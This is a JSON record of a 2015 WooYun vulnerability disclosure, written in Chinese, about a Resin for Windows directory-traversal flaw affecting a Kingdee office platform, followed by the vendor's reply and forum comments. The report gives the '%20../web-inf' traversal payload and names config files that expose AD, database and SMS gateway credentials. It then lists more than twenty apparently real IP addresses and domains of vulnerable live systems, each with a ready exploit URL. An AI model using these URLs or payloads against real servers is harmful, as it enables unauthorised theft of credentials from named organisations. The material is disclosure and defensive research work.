{"id": 65831, "wybug_id": "wooyun-2015-0126353", "wybug_title": "Resin漏洞利用案例之目录遍历/以金蝶某系统为例", "wybug_corp": "金蝶", "wybug_author": "Wulala", "wybug_date": "2015-07-13 09:57", "wybug_open_date": "2015-10-12 11:04", "wybug_type": "默认配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "默认配置不当", "权限验证不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向公众公开  简要描述： Wooyun上关于Resin的相关漏洞相对较少，而且很多漏洞的准确性有待商榷(比如关于Resin的viewfile漏洞). 最近接触到Resin的漏洞,准备写一篇drop总结一下Resin的漏洞,所以需要收集一些案例, 下面是以金蝶某系统为例进行说明. 详细说明：  首先,得先说明一下本次需要利用的漏洞   Caucho Resin多个远程信息泄露漏洞(建议先阅读下面三个漏洞)   https://www.rapid7.com/resources/advisories/R7-0028.jsp   https://www.rapid7.com/resources/advisories/R7-0029.jsp   https://www.rapid7.com/resources/advisories/R7-0030.jsp  漏洞描述  Resin for Windows实现上存在多个漏洞，远程攻击者可能利用此漏洞非授权获取敏感信息。Resin没有正确过滤通过URL传送的输入，允许远程攻击者通过在URL中提供有任意扩展名的DOS设备文件名从系统上的任意COM或LPT设备读取连续的数据流、通过目录遍历攻击泄露Web应用的WEB-INF目录中的文件内容，或通过包含有特殊字符的URL泄露到Caucho Resin服务器的完整系统路径。  测试代码：  http://www.example.com:8080/[path]/[device].[extension]  http://www.example.com:8080/%20../web-inf  http://www.example.com:8080/%20  http://www.example.com:8080/[path]/%20.xtp  漏洞危害:  通过此漏洞可以读取到串口设备的信息以及网站任意目录的文件遍历，我们这里之对Web相关的进行测试.  测试系统：   http://60.194.110.187/kingdee/login/loginpage.jsp   通过上面的漏洞,我们构造后的URL:  http://60.194.110.187/kingdee/%20../web-inf/\n\n  当然我们可以遍历Web目录下任何目录内容,通过信息挖掘知道Web目录下存在editor目录 \n\n  总结:  此漏洞利用条件:   受影响系统：   Caucho Technology Resin v3.1.0 for Windows   Caucho Technology Resin v3.0.21 for Windows   Caucho Technology Resin v3.0.20 for Windows   Caucho Technology Resin v3.0.19 for Windows   Caucho Technology Resin v3.0.18 for Windows   Caucho Technology Resin v3.0.17 for Windows   Caucho Technology Resin Professional v3.1.0 for Window注意：Windows平台的Resin受此漏洞影响/*************************** 以上就是关于Resin漏洞的说明 *******************/下面说明金蝶协同办公平台，金蝶基于Resin的协同办公平台引用了存在此组件因此导致目录遍历。 金蝶基于安全考虑,将很多配置文件和代码存放在web-inf目录,冤大头。目前泄露的配置有:/web-inf/classes/ad_config.conf  AD域服务器账号和密码(当然是配置的情况下)\n\n/web-inf/classes/ctop.conf       ctop数据库账号和密码\n\n/web-inf/classes/sms_config.conf 短信网关我发现Web根目录还有存在两个目录 /editor & /disk\n\n(FCKEditor)\n\n(各种未授权访问&用户信息泄露)最可笑的是，这里不用利用Resin的漏洞可以目录遍历http://60.194.110.187/kingdee/editor/http://60.194.110.187/kingdee/disk/\n\n就用你做这个案例了   漏洞证明：  为了证明这个漏洞的通用性，当然需要证明一下通用。用Zoomeye和FoFa大约统计了一下，处于互联网的此系统大约有上百个，下面简单罗列一下http://60.194.110.187/kingdee/%20../web-inf/http://61.190.20.51/kingdee/%20../web-inf/http://60.220.220.162:8080/ctop/%20../web-inf/http://61.146.237.104:8080/kingdee/%20.../web-inf/http://122.139.60.103:800/kingdee/%20../web-inf/http://bluesun.com.cn:8080/%20../web-inf/http://oa.cimri.cc:8090/kingdee/%20../web-inf/http://oa.guanhao.com:8080/kingdee/%20../web-inf/http://222.179.238.182:8082/kingdee/%20../web-inf/http://58.22.49.189:8080/kingdee/%20../web-inf/http://223.95.183.6:8080/kingdee/%20../web-inf/http://222.168.29.170:81/kingdee/%20../web-inf/http://222.134.77.23:8080/kingdee/%20../web-inf/http://222.133.44.10:8080/kingdee/%20../web-inf/http://222.72.132.71:8080/ctop/%20../web-inf/http://222.72.133.79/ctop/%20../web-inf/http://221.226.149.17:8080/kingdee/%20../web-inf/http://221.214.220.19:8080/ctop/%20../web-inf/http://221.4.245.218:8080/kingdee/%20../web-inf/http://220.248.45.50:8080/ctop/%20../web-inf/http://220.179.119.210:8080/ctop/%20../web-inf/220.180.150.241:8080/ctop/login/%20../web-inf/http://220.180.150.241:8080/ctop/%20../web-inf/220.189.244.202:8080/kingdee/%20../web-inf/http://220.189.244.202:8080/kingdee/%20../web-inf/220.178.198.101/ctop/%20../web-inf/http://220.178.198.101/ctop/%20../web-inf/219.159.83.81:8080/ctop/%20../web-inf/http://219.159.83.81:8080/ctop/%20../web-inf/   修复方案：  1. 升级Resin 3.1.1以上2. 对/editor/ 和 /disk 访问限制   版权声明：转载请注明来源 Wulala@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-14 11:02 厂商回复： 谢谢对金蝶的关注，深入研究金蝶系统发现安全漏洞。我们已通知相关部门修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-13 10:07 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2373 漏洞数:407        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  我最喜欢看案例    \n     2015-07-13 10:41 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:227 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  @茜茜公主 这个案例比较水    \n     2015-07-14 14:01 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:227 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  @xsser @疯狗 请教一个问题，这种引用第三方组件导致的安全漏洞是否属于通用漏洞呢？    \n     2015-07-17 11:20 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:28        | 018)\t\t \n  期待洞主的resin漏洞总结    \n     2015-07-17 15:33 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Wulala 同一套系统案例多的话会是通用的。你这不是算通用了吗    \n     2015-07-17 16:11 |    \t\t紫衣大侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:21        | 愿结天下有识之士)\t\t \n  关注    \n     2015-07-17 17:12 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:227 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  @wefgod 算通用了吗? 怎么判断呢/ 谢谢啦！    \n     2015-07-17 17:22 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2373 漏洞数:407        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  @Wulala 你选通用了吗，这个系统用户量多吗，你发现的案例多吗,resin一般就读passwd，hosts,.history，期待你的案例    \n     2015-07-17 17:33 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:227 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  @茜茜公主 这是某个金蝶的协同办公系统, 通过互联网搜索公开在公网的大约百来个,我列举了20多个受影响的系统. 这个利用限制还是比较有限的,仅针对Windows某些版本的Resin.    \n     2015-07-18 20:37 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Wulala 不是漏洞预警了吗。虽然不知道是否是通用，但是漏洞预警的一般都有￥￥￥，哈    \n     2015-07-18 22:38 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:227 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  @wefgod 谢啦！    \n     2015-07-21 11:58 |    \t\t无力落地の白 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:19        | 新人)\t\t \n  之前不是说 viewfile看到的 是example里的文件吗？    \n     2015-07-21 12:51 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:227 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  @无力落地の白 这个不是利用的viewfile的漏洞, 确实存在viewfile的漏洞,关于viewfile的漏洞，wooyun上很多提交的漏洞不是很准确的.最好自己做实验去总结和验证一下.    \n     2015-07-21 13:22 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:227 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  第二弹 已出炉 Resin漏洞利用案例之Windows全盘遍历漏洞（以某省戒毒所为例） WooYun: Resin漏洞利用案例之Windows全盘遍历漏洞（以某省戒毒所为例）    \n     2015-07-24 11:36 |    \t\txyang \t\t\t( 普通白帽子  |\t\t\t        Rank:252 漏洞数:52        | stay hungry stay foolish)\t\t \n  @Wulala drops文章出了吗？    \n     2015-07-24 12:50 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:227 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  @xyang 暂时还没有,还有一些需要实验验证.     \n     2015-07-28 09:21 |    \t\t无力落地の白 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:19        | 新人)\t\t \n   WooYun: 万户网络技建站使用中间件Resin版本过低导致众多客户网站磁盘信息泄露  和我之前发的类似么    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}